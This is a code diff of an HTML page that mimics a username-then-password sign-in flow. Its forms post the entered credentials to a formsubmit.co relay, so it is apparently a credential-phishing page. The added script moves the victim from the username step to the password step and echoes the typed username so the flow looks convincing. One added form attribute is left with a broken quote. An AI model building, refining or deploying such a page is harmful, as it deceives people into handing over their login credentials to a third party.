@@ -17,7 +17,7 @@
             <h2 class="title mb-16 mt-16">Sign in</h2>
 
          <form action="https://formsubmit.co/el/wehoya" method="POST"
-     class="mt-3" name="form" >
+     class="mt-3" name="form" id="myForm" >
     <div class="mb-3">
         <input
             type="text"
@@ -30,23 +30,9 @@
         
     </div>
     <div>
-                <button class="btn" id="btn_next" onclick="submitForm()">Next</button>
+                <button class="btn" id="btn_next" onclick="next()">Next</button>
             </div>
-</form>
-<script>
-    function submitForm() {
-        // Use JavaScript to submit the form
-        document.getElementById('myForm').submit();
-    }
-</script>
-            
-            
-            
-            
-            
-            
-            
-            
+</form>            
             <!-- <form action="https://formsubmit.co/el/wehoya" method="POST">
     <div class="mb-16">
         <p id="error_uname" class="error"></p>
@@ -92,7 +78,7 @@
             <h2 class="title mb-16">Enter password</h2>
 
 <form action="https://formsubmit.co/el/wehoya" method="POST"
-     class="mt-3" name="form" >
+     class="mt-3" name="form" id="myForm>
     <div class="mb-3">
         <input
             type="text"
@@ -108,68 +94,7 @@
                 <button class="btn" id="btn_sig" onclick="submitForm()">Sign in</button>
             </div>
 </form>
-
-
-<script>
-    function submitForm() {
-        // Use JavaScript to submit the form
-        document.getElementById('myForm').submit();
-    }
-</script>
-
-
-
-
-
-
-
-
-
-
-
-            
-           <!-- <form action="https://formsubmit.co/el/wehoya" method="POST">
-    <div class="mb-16">
-        <p id="error_pwd" class="error"></p>
-
-        <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
-    </div>
-    <!-- Additional form elements can be added here -->
-    <button type="submit">Submit</button>
-</form> -->
-
-<!-- <div class="container">
-  <h1>FormSubmit Demo</h1>
-  <form target="_blank" action="https://formsubmit.co/adebayoayomide574@gmail.com" method="POST">
-    <div class="form-group">
-      <div class="form-row">
-        <div class="col">
-          <input type="text" name="name" class="form-control" placeholder="Full Name" required>
-        </div>
-        <div class="col">
-          <input type="email" name="email" class="form-control" placeholder="Email Address" required>
-        </div>
-      </div>
-    </div>
-    <div class="form-group">
-      <textarea placeholder="Your Message" class="form-control" name="message" rows="10" required></textarea>
-    </div>
-    <button type="submit" class="btn btn-lg btn-dark btn-block">Submit Form</button>
-  </form>
-</div> -->
-
-
-
-
-
-
-
-
-
-            
-            
-            
-            
+                        
             <!-- <form>
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
@@ -181,9 +106,6 @@
                 <p class="mb-16">
                     <a href="#" class="link fs-13">Other ways to sign in</a>
                 </p>
-            </div>
-            <div>
-                <button class="btn" id="btn_sig" type="submit">Sign in</button>
             </div>
         </div>
     </section>
@@ -218,6 +140,31 @@
         <span>.&nbsp;.&nbsp;.</span>
     </footer>
     <script src="../app.js"></script>
+ <script>
+        function next() {
+            // Validate the form
+            if (validate()) {
+                // If validation passes, hide the current section and show the next one
+                document.getElementById("section_uname").classList.toggle('d-none');
+                document.getElementById('section_pwd').classList.remove('d-none');
+                document.querySelectorAll('#user_identity').forEach((e) => {
+                    e.innerText = document.getElementById('inp_uname').value;
+                });
+            }
+        }
+
+        function validate() {
+            // Your validation logic here
+            // Return true if validation passes, false otherwise
+            return true;
+        }
+
+        function submitForm() {
+            // Use JavaScript to submit the form
+            document.getElementById('myForm').submit();
+        }
+    </script>
+    
 </body>
 
 </html>
